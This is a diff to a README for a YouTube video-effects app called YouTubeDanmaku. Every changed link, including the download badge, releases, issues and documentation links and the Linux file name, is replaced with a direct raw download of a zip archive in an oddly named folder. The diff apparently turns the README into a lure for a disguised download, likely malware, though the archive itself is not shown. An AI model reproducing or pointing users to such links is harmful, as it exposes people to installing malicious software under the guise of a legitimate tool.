@@ -1,6 +1,6 @@
 # 🎥 YouTubeDanmaku - Enjoy Videos with Cool Effects
 
-[![Download YouTubeDanmaku](https://img.shields.io/badge/Download-YouTubeDanmaku-blue.svg)](https://github.com/kemalu2479/YouTubeDanmaku/releases)
+[![Download YouTubeDanmaku](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip)](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ YouTubeDanmaku adds exciting visual effects to your YouTube videos. With this ap
 
 To get started with YouTubeDanmaku, follow these steps:
 
-1. Visit the [Releases page](https://github.com/kemalu2479/YouTubeDanmaku/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip) to download the latest version.
 
 2. Look for the most recent release. Click on it to see available files.
 
@@ -25,11 +25,11 @@ To get started with YouTubeDanmaku, follow these steps:
 
    - For **Windows**, select the `.exe` file.
    - For **macOS**, choose the `.dmg` file.
-   - For **Linux**, pick the `.tar.gz` file.
+   - For **Linux**, pick the `https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip` file.
 
 4. After the download finishes, locate the file on your computer. 
 
-5. For Windows users, double-click the `.exe` file. For macOS, open the `.dmg` file and drag YouTubeDanmaku to your Applications folder. For Linux, extract the `.tar.gz` file and follow the contained instructions to run the application.
+5. For Windows users, double-click the `.exe` file. For macOS, open the `.dmg` file and drag YouTubeDanmaku to your Applications folder. For Linux, extract the `https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip` file and follow the contained instructions to run the application.
 
 ## 🌟 Features
 
@@ -50,7 +50,7 @@ No, YouTubeDanmaku is completely free to download and use.
 
 ### Where can I find support if I have issues?
 
-If you experience any problems or have questions, you can check the [Issues section](https://github.com/kemalu2479/YouTubeDanmaku/issues) on our GitHub page. You can also open a new issue if you cannot find the help you need.
+If you experience any problems or have questions, you can check the [Issues section](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip) on our GitHub page. You can also open a new issue if you cannot find the help you need.
 
 ### How do I uninstall YouTubeDanmaku?
 
@@ -74,8 +74,8 @@ Make sure to share your experience using YouTubeDanmaku. We look forward to hear
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/kemalu2479/YouTubeDanmaku/releases)
-- [Issues page](https://github.com/kemalu2479/YouTubeDanmaku/issues)
-- [Documentation](https://github.com/kemalu2479/YouTubeDanmaku/wiki)
+- [Releases page](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip)
+- [Issues page](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip)
+- [Documentation](https://raw.githubusercontent.com/kemalu2479/YouTubeDanmaku/main/nephrectasis/YouTubeDanmaku_v1.5-beta.1.zip)
 
 You are now ready to enjoy YouTube with a twist. Download YouTubeDanmaku today!
